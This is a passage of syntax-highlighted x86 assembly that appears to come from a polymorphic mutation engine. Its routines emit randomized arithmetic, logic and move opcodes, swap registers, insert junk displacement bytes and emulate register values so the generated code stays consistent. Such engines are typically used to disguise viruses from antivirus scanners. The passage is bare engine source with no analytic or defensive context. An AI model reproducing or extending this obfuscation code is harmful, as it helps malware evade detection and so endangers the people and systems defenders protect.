                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@long_dontfollow</span><span class="sc0">

</span><span class="sc5">@@short_dontfollow</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random_byte</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">                    </span><span class="sc1">;displacement(that dont get exec)</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc5">@@long_dontfollow</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random_dword</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc1">; --------------------- common subroutines ----------------------------------</span><span class="sc0">

</span><span class="sc1">; input: EAX=opcode, REG1,REG2</span><span class="sc0">

</span><span class="sc5">@@swap</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOSWAP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@swap_retn</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@swap_retn</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; bit 'S', means swap regs</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">      </span><span class="sc1">; so, the same action</span><span class="sc0">
</span><span class="sc5">@@swap_retn</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@oralR1_stosb</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc5">@@orahR1_stosw</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc5">@@swap_stosb_modrm</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@swap</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosb_modrm</span><span class="sc0">

</span><span class="sc5">@@stosw_modrm</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">@@stosb_modrm</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modrm</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc5">@@modrm</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc5">REG2_8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2_8</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@stosw_modrm_stosbX</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modrm</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosbX</span><span class="sc0">

</span><span class="sc5">@@stosb_modrm_stosd</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modrm</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosd</span><span class="sc0">

</span><span class="sc5">@@oralR1_stosb_stosd</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
</span><span class="sc5">@@stosb_stosd</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">@@stosd</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc5">@@orahR1_stosw_stosd</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosd</span><span class="sc0">

</span><span class="sc5">@@checkshort</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@orahR1_stosw_stosbX</span><span class="sc0">

                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOSHORT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@orahR1_stosw_stosd</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw_stosd</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosb_stosd</span><span class="sc0">

</span><span class="sc5">@@orahR1_stosw_stosbX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">@@stosbX</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XXX_8</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc5">@@modarg</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">                 </span><span class="sc1">; if (x==0) x++;</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@stos3or</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XXX_8</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">@@x_not</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_NOT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; emul -- not r1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d0f7h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_neg</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_NEG</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; emul -- neg r1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d8f7h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_inc</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_INC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; emul -- inc r1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@oralR1_stosb</span><span class="sc0">

</span><span class="sc5">@@x_dec</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_DEC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; emul -- dec r1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@oralR1_stosb</span><span class="sc0">

</span><span class="sc5">@@x_shl</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_SHL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; emul -- shl r1, 1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0d1h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_shr</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_SHR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; emul -- shr r1, 1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8d1h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_rol</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_ROL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; emul -- rol r1, 1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0d1h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_ror</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_ROR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; emul -- ror r1, 1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8d1h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_sar</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_SAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">sar</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; emul -- sar r1, 1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8d1h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_xor</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_XOR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- xor r1, r2</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@swap_stosb_modrm</span><span class="sc0">

</span><span class="sc5">@@x_add</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_ADD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- add r1, r2</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@swap_stosb_modrm</span><span class="sc0">

</span><span class="sc5">@@x_sub</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_SUB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- sub r1, r2</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@swap_stosb_modrm</span><span class="sc0">

</span><span class="sc5">@@x_mov</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_MOV</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- mov r1, r2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@swap_stosb_modrm</span><span class="sc0">

</span><span class="sc5">@@x_xchg</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_XCHG</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- xchg r1, r2</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">87h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosb_modrm</span><span class="sc0">

</span><span class="sc5">@@x_and</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_AND</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- and r1, r2</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@swap_stosb_modrm</span><span class="sc0">

</span><span class="sc5">@@x_or</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_OR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- or r1, r2</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@swap_stosb_modrm</span><span class="sc0">

</span><span class="sc5">@@x_mov_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_MOV</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- mov r1, c</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">                </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@oralR1_stosb_stosd</span><span class="sc0">

</span><span class="sc5">@@x_add_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_ADD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05C081h</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@try_short</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- add r1, c</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@checkshort</span><span class="sc0">

